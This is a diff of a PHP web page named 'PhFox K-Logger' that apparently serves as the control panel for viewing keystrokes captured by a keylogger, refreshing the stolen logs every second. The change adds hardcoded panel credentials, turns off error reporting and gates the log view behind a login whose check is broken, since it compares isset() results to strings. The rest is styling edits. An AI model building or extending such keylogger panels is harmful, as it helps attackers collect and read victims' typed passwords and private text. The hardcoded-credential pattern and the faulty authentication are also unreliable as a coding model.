@@ -1,6 +1,8 @@
 <?php 
-#error_reporting(0);
+error_reporting(0);
 session_start ();
+$userl = "ph-fox";
+$passl = "fox!you";
 function loginForm() {
     echo '
 	<div class="form-group">
@@ -8,7 +10,7 @@ function loginForm() {
 			<form action="index.php" method="post">
 			<h1> PhFox K-Logger</h1><hr/>
 				<label for="name">LOGIN</label><br>
-				<input class="inppd" type="text" name="user" id="user" placeholder="User" required autocomplete="off"/><br>
+				<input class="inppd" type="text" name="user" id="user" onclick="chge()" placeholder="User" required autocomplete="off"/><br>
 				<input class="inppd" type="password" name="password" id="password" placeholder="Password" required/><br>
 				<input type="submit" name="enter" id="enter" value="Login" />
 			</form>
@@ -16,7 +18,16 @@ function loginForm() {
 	</div>
    ';
 }
-loginForm();
+
+if(isset($_REQUEST['enter'])){
+	if(isset($_REQUEST['user']) == $userl and isset($_REQUEST['password']) == $passl){
+		$up = $userl.'<:>'.$passl;
+		$_SESSION['data'] = stripslashes(htmlspecialchars($up));
+	}else{
+		echo "<h2 style='color:red;'><b>Error Wrong Credentials Entered!</b></h2>";
+	}
+}
+
 ?>
 <!DOCTYPE html>
 <html>
@@ -26,6 +37,12 @@ loginForm();
 	<script type="text/javascript" src="js/jquery.min.js"></script>
 	<title>PhFox K-Log</title>
 </head>
+<?php 
+if(!isset($_SESSION['data'])){
+	loginForm();
+}else{
+
+?>
 <body >
 	<div class="heading">
 		<h1>Ph-Fox KeyLogs</h1>
@@ -39,7 +56,11 @@ loginForm();
 		?>
 	</div>
 </body>
+<?php
+}
+?>
 <script>
+
 function loadLog(){    
     var oldscrollHeight = $("#logs").attr("scrollHeight") - 20;
     $.ajax({
@@ -102,16 +123,19 @@ setInterval (loadLog, 1000);
 		text-align: center;
 	}
 	.form-group{
+		height: 100%;
+		position: ab;
 		margin: 0 auto;
 		background-color: #101010;
+		align-items: center;
 		display: flex;
 		justify-content: center;
 	}
 	#loginform{
-		align-items: center;
 		text-align: center;
 		background-color: #090909;
 		width: 40%;
+		height: 50%;
 		font-family: sans-serif;
 		color: cyan;
 		border: 1px solid black;
@@ -129,9 +153,10 @@ setInterval (loadLog, 1000);
 		background-color: black;
 		width: 40%;
 	}
-	#loginform input:active{
-		box-shadow: 0px 0px 1px 1px cyan !important;
-
+	#loginform input:focus{
+		transition: .4s;
+		outline: 1px solid cyan;
+		box-shadow: 0px 0px 5px 1px cyan;
 	}
 	#enter{
 		box-shadow: 0px 0px 0px 0px gray !important;
@@ -143,6 +168,5 @@ setInterval (loadLog, 1000);
 		background-color: #090909 !important;
 		cursor: pointer;
 	}
-
 </style>
 </html>
